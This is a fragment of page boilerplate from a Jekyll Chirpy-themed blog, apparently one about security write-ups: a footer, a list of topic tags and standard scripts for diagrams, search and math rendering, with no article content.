<a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
